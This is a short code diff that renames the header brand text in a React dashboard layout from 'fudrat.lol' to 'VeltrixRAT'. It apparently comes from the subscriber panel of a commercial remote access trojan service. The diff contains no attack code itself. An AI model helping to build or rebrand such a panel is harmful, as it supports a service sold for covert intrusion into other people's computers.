@@ -125,7 +125,7 @@ function DashboardLayout() {
       <header className="sticky top-0 z-30 border-b border-border bg-background/85 backdrop-blur hidden sm:block">
         <div className="flex h-14 items-center justify-between px-5">
           <div className="flex items-center gap-2">
-            <span className="text-sm font-semibold tracking-tight font-mono">fudrat.lol</span>
+            <span className="text-sm font-semibold tracking-tight font-mono">VeltrixRAT</span>
           </div>
           <div className="flex items-center gap-2">
             {!sub.loading && <CountdownBadge msLeft={sub.msLeft} />}
@@ -169,7 +169,7 @@ function DashboardLayout() {
           <button onClick={() => setMobileMenuOpen(!mobileMenuOpen)} className="rounded-md p-2 text-muted-foreground hover:bg-accent">
             {mobileMenuOpen ? <X className="h-5 w-5" /> : <Menu className="h-5 w-5" />}
           </button>
-          <span className="text-sm font-semibold tracking-tight font-mono">fudrat.lol</span>
+          <span className="text-sm font-semibold tracking-tight font-mono">VeltrixRAT</span>
           <div className="flex items-center gap-1">
             <LanguageSwitcher compact={true} />
             {profile?.avatar_url ? (
